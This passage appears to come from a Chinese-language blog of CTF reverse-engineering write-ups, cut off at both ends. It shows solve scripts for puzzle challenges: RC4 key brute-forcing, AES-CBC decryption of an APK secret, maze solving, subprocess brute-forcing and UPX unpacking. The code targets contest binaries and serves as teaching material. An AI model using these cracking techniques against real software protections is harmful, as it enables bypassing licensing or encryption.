= 0</span></span><br><span class="line"><span class="comment"># #     for i in range(256):</span></span><br><span class="line"><span class="comment"># #         j = (j + S[i] + ord(key[i % len(key)])) % 256</span></span><br><span class="line"><span class="comment"># #         S[i], S[j] = S[j], S[i]</span></span><br><span class="line"><span class="comment"># #     # PRGA</span></span><br><span class="line"><span class="comment"># #     i = 0</span></span><br><span class="line"><span class="comment"># #     j = 0</span></span><br><span class="line"><span class="comment"># #     keystream = []</span></span><br><span class="line"><span class="comment"># #     for k in range(26):</span></span><br><span class="line"><span class="comment"># #         i = (i + 1) % 256</span></span><br><span class="line"><span class="comment"># #         j = (j + S[i]) % 256</span></span><br><span class="line"><span class="comment"># #         S[i], S[j] = S[j], S[i]</span></span><br><span class="line"><span class="comment"># #         keystream.append(S[(S[i] + S[j]) % 256])</span></span><br><span class="line"><span class="comment"># #</span></span><br><span class="line"><span class="comment"># #     enc = "".join(map(chr, [(cipher[i] ^ keystream[i]) for i in range(len(keystream))]))</span></span><br><span class="line"><span class="comment"># #     if "flag" in enc:</span></span><br><span class="line"><span class="comment"># #         print(key)</span></span><br><span class="line"><span class="comment"># #</span></span><br><span class="line"><span class="comment"># #</span></span><br><span class="line"><span class="comment"># # for i in range(256):  # 48-57 ---- 0-9</span></span><br><span class="line"><span class="comment"># #     for j in range(256):</span></span><br><span class="line"><span class="comment"># #         for k in range(256):</span></span><br><span class="line"><span class="comment"># #             RC4(chr(i) + chr(j) + chr(k))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># def Rc4_Encrypt(m, key):</span></span><br><span class="line"><span class="comment">#     s = []</span></span><br><span class="line"><span class="comment">#     t = []</span></span><br><span class="line"><span class="comment">#     out = []  # putput</span></span><br><span class="line"><span class="comment">#     for i in range(256):</span></span><br><span class="line"><span class="comment">#         s.append(i)</span></span><br><span class="line"><span class="comment">#         t.append(ord(key[i % len(key)]))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     j = 0</span></span><br><span class="line"><span class="comment">#     for i in range(256):</span></span><br><span class="line"><span class="comment">#         j = (j + s[i] + t[i]) % 256</span></span><br><span class="line"><span class="comment">#         s[i], s[j] = s[j], s[i]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     i, j = 0, 0</span></span><br><span class="line"><span class="comment">#     for p in range(len(m)):</span></span><br><span class="line"><span class="comment">#         i = (i + 1) % 256</span></span><br><span class="line"><span class="comment">#         j = (j + s[i]) % 256</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#         s[i], s[j] = s[j], s[i]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#         index = (s[i] + s[j]) % 256</span></span><br><span class="line"><span class="comment">#         out.append(s[index] ^ m[p])</span></span><br><span class="line"><span class="comment">#     return (bytes(out))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># import itertools</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># c = [0x6, 0x74, 0xb4, 0xe2, 0x49, 0xd, 0x91, 0x36, 0x95, 0x9d, 0x7a, 0xfe, 0xc7, 0xa9, 0xa4, 0xa1, 0xf0, 0xf6, 0x3,</span></span><br><span class="line"><span class="comment">#      0x56, 0x90, 0xfa, 0x1a, 0x32, 0xa7, 0x6d, 0x39, 0xee]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># k = []</span></span><br><span class="line"><span class="comment"># for i in itertools.product([str(i) for i in range(256)], repeat=3):</span></span><br><span class="line"><span class="comment">#     k.append(i)</span></span><br><span class="line"><span class="comment"># for j in itertools.product([str(j) for j in range(256)], repeat=3):</span></span><br><span class="line"><span class="comment">#     k.append(j)</span></span><br><span class="line"><span class="comment"># for m in itertools.product([str(m) for m in range(256)], repeat=3):</span></span><br><span class="line"><span class="comment">#     k.append(m)</span></span><br><span class="line"><span class="comment"># # k = []</span></span><br><span class="line"><span class="comment"># # for i in range(256):</span></span><br><span class="line"><span class="comment"># #     for j in range(256):</span></span><br><span class="line"><span class="comment"># #         for m in range(256):</span></span><br><span class="line"><span class="comment"># #             k = '2023'</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     out = Rc4_Encrypt(bytes(c), k)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         print(out.decode())</span></span><br><span class="line"><span class="comment">#     except:</span></span><br><span class="line"><span class="comment">#         print("err")</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RC4</span>(<span class="params">keys</span>):</span><br><span class="line">    cipher = [<span class="number">0x6</span>, <span class="number">0x74</span>, <span class="number">0xb4</span>, <span class="number">0xe2</span>, <span class="number">0x49</span>, <span class="number">0xd</span>, <span class="number">0x91</span>, <span class="number">0x36</span>, <span class="number">0x95</span>, <span class="number">0x9d</span>, <span class="number">0x7a</span>, <span class="number">0xfe</span>, <span class="number">0xc7</span>, <span class="number">0xa9</span>, <span class="number">0xa4</span>, <span class="number">0xa1</span>, <span class="number">0xf0</span>, <span class="number">0xf6</span>, <span class="number">0x3</span>, <span class="number">0x56</span>, <span class="number">0x90</span>, <span class="number">0xfa</span>, <span class="number">0x1a</span>, <span class="number">0x32</span>, <span class="number">0xa7</span>, <span class="number">0x6d</span>, <span class="number">0x39</span>, <span class="number">0xee</span>]</span><br><span class="line">    key = <span class="built_in">list</span>(keys)</span><br><span class="line">    <span class="comment"># KSA</span></span><br><span class="line">    S = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="comment"># PRGA</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    keystream = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        keystream.append(S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line"></span><br><span class="line">    enc = <span class="string">""</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, [(cipher[i] ^ keystream[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(keystream))]))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> enc:</span><br><span class="line">        <span class="built_in">print</span>(key)</span><br><span class="line">        <span class="built_in">print</span>(enc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">126</span>):  <span class="comment"># 48-57 ---- 0-9</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">126</span>):</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">126</span>):</span><br><span class="line">            RC4(<span class="built_in">chr</span>(i) + <span class="built_in">chr</span>(j) + <span class="built_in">chr</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ['r', 'd', '}']</span></span><br><span class="line"><span class="comment"># flag{Go_1an9_1s_n07_s0_Hard}</span></span><br></pre></td></tr></tbody></table></figure><p>python 比较慢  </p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403160016011.png" alt="image-20230403160016011"></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF2023逆向区WriteUp</title>
      <link href="/2023/03/27/reverse-NKCTF2023WP/"/>
      <url>/2023/03/27/reverse-NKCTF2023WP/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="try-decrypt-me"><a href="#try-decrypt-me" class="headerlink" title="try_decrypt_me"></a>try_decrypt_me</h1><p>apk文件 - Android逆向  挺好 正好我也正在转型移动安全</p><p>我习惯上是用jadx来反编译（界面美观， 一目了然呀）</p><p>但是这题 实话说 jeb比较友好</p><p>我用jadx卡半天 没找到密文</p><p>jeb直接跟踪， 并且该做的某些操作都自动化完成了（比如 替换操作等等）</p><p>笔者建议的话  先用jedx看逻辑</p><p>然后jeb  而且 jeb还可以跟踪 （动调）</p><p>对比一下</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230327113004121.png" alt="image-20230327113004121"></p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230327113120438.png" alt="image-20230327113120438"></p><p>主要就是 AES加密 </p><p>然后注意 CBC模式  这儿有个base64</p><p>如果工具解  先base64解密一下</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230327113225487.png" alt="image-20230327113225487"></p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">encData = <span class="string">"BxLHc1KruiH31I94W171oal+9olDzgBIjnK/J1Db0IUyi+MbI38+nw62ejCPShRB"</span></span><br><span class="line">key1 = <span class="string">"r3v3rs3car3fully"</span></span><br><span class="line"><span class="comment"># 在线网站求出MD5 key2 = "reversehavemagic"</span></span><br><span class="line">key2 = <span class="string">"c368938a22ddbd9c77721fd203ac2c9c"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网上找的</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">key, text</span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    解密 ：偏移量为key[0:16]；先base64解，再AES解密，后取消补位</span></span><br><span class="line"><span class="string">    :param encrypted_text : 已经加密的密文</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    iv = <span class="string">"r3v3rs3car3fully"</span></span><br><span class="line">    encrypted_text = b64decode(text)</span><br><span class="line">    cipher = AES.new(key=key.encode(), mode=AES.MODE_CBC, IV=iv.encode())</span><br><span class="line">    decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class="line">    <span class="keyword">return</span> decrypted_text.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># key的长度需要补长(16倍数),补全方式根据情况而定,此处我就手动以‘0’的方式补全的32位key</span></span><br><span class="line">    <span class="comment"># key字符长度决定加密结果,长度16：加密结果AES(128),长度32：结果就是AES(256)</span></span><br><span class="line">    text = <span class="string">"BxLHc1KruiH31I94W171oal+9olDzgBIjnK/J1Db0IUyi+MbI38+nw62ejCPShRB"</span></span><br><span class="line">    key = <span class="string">"c368938a22ddbd9c77721fd203ac2c9c"</span></span><br><span class="line"></span><br><span class="line">    decrypt_result = aes_decrypt(key, text)</span><br><span class="line">    <span class="built_in">print</span>(decrypt_result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NKCTF{nI_k@i_sHi_zhu_j1an_il_Jie_RE_le}             </span></span><br></pre></td></tr></tbody></table></figure><p>CyberChef 直接跑   更快</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230327114628137.png" alt="image-20230327114628137"></p><h1 id="PMKF"><a href="#PMKF" class="headerlink" title="PMKF"></a>PMKF</h1><p>file验证 + 迷宫</p><p>运行的 回显</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329190320600.png" alt="image-20230329190320600"></p><p>拖入ida分析</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329191050593.png" alt="image-20230329191050593"></p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329191120362.png" alt="image-20230329191120362"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401090</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> Val; <span class="comment">// [esp+4h] [ebp-15Ch]</span></span><br><span class="line">  <span class="type">char</span> Vala; <span class="comment">// [esp+4h] [ebp-15Ch]</span></span><br><span class="line">  <span class="type">char</span> Valb; <span class="comment">// [esp+4h] [ebp-15Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+20h] [ebp-140h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+24h] [ebp-13Ch]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [esp+2Ch] [ebp-134h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+30h] [ebp-130h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+30h] [ebp-130h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+30h] [ebp-130h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+30h] [ebp-130h]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [esp+34h] [ebp-12Ch]</span></span><br><span class="line">  DWORD NumberOfBytesRead; <span class="comment">// [esp+3Ch] [ebp-124h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 Buffer; <span class="comment">// [esp+43h] [ebp-11Dh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">16</span>]; <span class="comment">// [esp+44h] [ebp-11Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">256</span>]; <span class="comment">// [esp+54h] [ebp-10Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  ReadFile(hObject, &amp;Buffer, <span class="number">1u</span>, &amp;NumberOfBytesRead, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Buffer != <span class="number">5</span> )</span><br><span class="line">  {</span><br><span class="line">    sub_401690(<span class="string">"Wrong!\n"</span>, Val);                <span class="comment">//                  读取文件第一个byte  必须为5 否则Wrong</span></span><br><span class="line">    CloseHandle(hObject);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  ReadFile(hObject, v15, Buffer, &amp;NumberOfBytesRead, <span class="number">0</span>);<span class="comment">//       第二次读取 v15个字节 - 必须和405100相等 否则wrong</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; Buffer; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( v15[i] != byte_405100[i] )    <span class="comment">// nkman</span></span><br><span class="line">    {</span><br><span class="line">      sub_401690(<span class="string">"Wrong!\n"</span>, Vala);</span><br><span class="line">      CloseHandle(hObject);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v8 &lt; Buffer )                         <span class="comment">//                v11 下文用到  是一个key</span></span><br><span class="line">    v11 += v15[v8++];</span><br><span class="line">  ReadFile(hObject, v14, <span class="number">0x10</span>u, &amp;NumberOfBytesRead, <span class="number">0</span>);</span><br><span class="line">  v5 = <span class="number">18</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j )                    <span class="comment">//                  读取v14（0x10字节） </span></span><br><span class="line">                                                <span class="comment">//                  经异或 数组v14 经过下面算法 走迷宫</span></span><br><span class="line">    v14[j] ^= v11;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v10 &lt; <span class="number">16</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">6</span>; k &gt;= <span class="number">0</span>; k -= <span class="number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">switch</span> ( ((<span class="type">unsigned</span> __int8)v14[v10] &gt;&gt; k) &amp; <span class="number">3</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">          v5 -= <span class="number">18</span>;</span><br><span class="line">          <span class="keyword">break</span>;                                <span class="comment">//         很明显</span></span><br><span class="line">                                                <span class="comment">//         0 上</span></span><br><span class="line">                                                <span class="comment">//         1 右</span></span><br><span class="line">                                                <span class="comment">//         2 下</span></span><br><span class="line">                                                <span class="comment">//         3 左</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          ++v5;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          v5 += <span class="number">18</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          --v5;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( aN[v5] == <span class="string">'*'</span> || aN[v5] == <span class="string">' '</span> )     <span class="comment">//           不能碰“墙” ！</span></span><br><span class="line">      {</span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( aN[v5] == <span class="string">'K'</span> )                      <span class="comment">//           K是终点 aN是迷宫  N是起点</span></span><br><span class="line">      {</span><br><span class="line">        sub_401690(<span class="string">"Congratulations! you found it!\n"</span>, Valb);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    ++v10;</span><br><span class="line">  }</span><br><span class="line">  CloseHandle(hObject);                         <span class="comment">//         closefile</span></span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>主逻辑就是这样  然后的发现没看到Error的回显</p><p>对<code>hObject</code> 交叉引用 发现了  要在C盘根目录 创建文件<code>nk.ctf</code> </p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329191223687.png" alt="image-20230329191223687"></p><p>迷宫是这个</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">******************</span><br><span class="line">N...*****...*....*</span><br><span class="line">**.*****..*...**.*</span><br><span class="line">...*****.*****.*.*</span><br><span class="line">.**....*..*...*..*</span><br><span class="line">....**.*.*..*...**</span><br><span class="line">*.**...*.*.*******</span><br><span class="line">..*****..*......**</span><br><span class="line">.*......**.****.**</span><br><span class="line">...*****...*K...**</span><br><span class="line">******************</span><br></pre></td></tr></tbody></table></figure><p>exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">'1122332212232211011111010000010112110111222323303323221111122333'</span>  <span class="comment"># 迷宫</span></span><br><span class="line">b = []</span><br><span class="line"><span class="comment"># 暴破出 算法部分 -- 后来知道就是4转16进制而已</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a), <span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        <span class="comment"># t = (x ^ 0x15) &amp; 0xff</span></span><br><span class="line">        v1 = <span class="built_in">str</span>((x &gt;&gt; <span class="number">0</span>) &amp; <span class="number">3</span>)</span><br><span class="line">        v2 = <span class="built_in">str</span>((x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>)</span><br><span class="line">        v3 = <span class="built_in">str</span>((x &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>)</span><br><span class="line">        v4 = <span class="built_in">str</span>((x &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span>)</span><br><span class="line">        tmp = v4 + v3 + v2 + v1</span><br><span class="line">        <span class="keyword">if</span> tmp == a[i:i + <span class="number">4</span>]:</span><br><span class="line">            b.append(x)</span><br><span class="line">            <span class="built_in">print</span>(tmp)</span><br><span class="line"><span class="comment"># 逆推  异或的部分</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    b[i] ^= <span class="number">0x15</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(i))[<span class="number">2</span>:], end=<span class="string">' '</span>)</span><br><span class="line"><span class="comment"># 将其写入nk.ctf中</span></span><br><span class="line"><span class="comment"># 4f ef 7e b0 0 44 15 4 70 0 be a9 ee b0 43 aa</span></span><br></pre></td></tr></tbody></table></figure><p>最后写入文件  用010插入</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329191615350.png" alt="image-20230329191615350"></p><p>运行  OK</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329190234252.png" alt="image-20230329190234252"></p><h1 id="babyrust-rust-x2F-subprocess"><a href="#babyrust-rust-x2F-subprocess" class="headerlink" title="babyrust - rust/subprocess"></a>babyrust - rust/subprocess</h1><p>什么鬼 ？ 我又没学过 rust</p><p>我是请教了别的师傅</p><p>用python的<code>subprocess</code>模块</p><p>进行暴破的  </p><p>又学到一招  嘿嘿</p><p>Orz Orz</p><p>拖入ida64 分析  然后  我靠</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329192020361.png" alt="image-20230329192020361"></p><p>自己看了看  发现确实能看懂个差不多</p><p>但我这嫌麻烦  直接暴破了</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329192736704.png" alt="image-20230329192736704"></p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329193011621.png" alt="image-20230329193011621"></p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329192810390.png" alt="image-20230329192810390"></p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329192859143.png" alt="image-20230329192859143"></p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">encData = <span class="string">")&amp;n_qFb'NZXpj)*bLDmLnVj]@^_H"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = {}</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    asc = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_"</span></span><br><span class="line">    lst = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(asc)):</span><br><span class="line">        p = subprocess.Popen([<span class="string">'babyrust.exe'</span>], shell=<span class="literal">False</span>, stdin=subprocess.PIPE, stdout=subprocess.PIPE,</span><br><span class="line">                             stderr=subprocess.STDOUT)</span><br><span class="line">        a = p.communicate((asc[i].encode()))[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">dict</span>[a.decode()[<span class="number">134</span>:<span class="number">135</span>]] = asc[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">dict</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> encData:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">dict</span>[i], end=<span class="string">""</span>)</span><br><span class="line"><span class="comment"># NKCTF{WLcomE_NOWayBaCk_RuST}</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329193130787.png" alt="image-20230329193130787"></p><h1 id="not-a-like-RSA-x2F-RC4"><a href="#not-a-like-RSA-x2F-RC4" class="headerlink" title="not_a_like - RSA/RC4"></a>not_a_like - RSA/RC4</h1><p>查壳  有壳  但<code>upx -d</code>脱不掉</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329195431975.png" alt="image-20230329195431975"></p><p>这是因为特征码被删了</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329200119731.png" alt="image-20230329200119731"></p><p>打开die  改一下</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329195840474.png" alt="image-20230329195840474"></p><p>然后再拖一下  OK了</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329195934376.png" alt="image-20230329195934376"></p><p>脱完壳  运行不了</p><p>但是可以从静态反汇编看出是pyinstaller打包的python程序</p><p>（当然， 也可以猜一猜  bushi    Orz）</p><p><code>python pyinstxtractor.py xx.exe</code>解包</p><p><img src="/2023/03/27/reverse-NKCTF2023WP/image-20230329200337933.png" alt="image-20230329200337933"></p><p>很明显需要  添加pyc文件头对文件进行修复</p><p>stuct</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 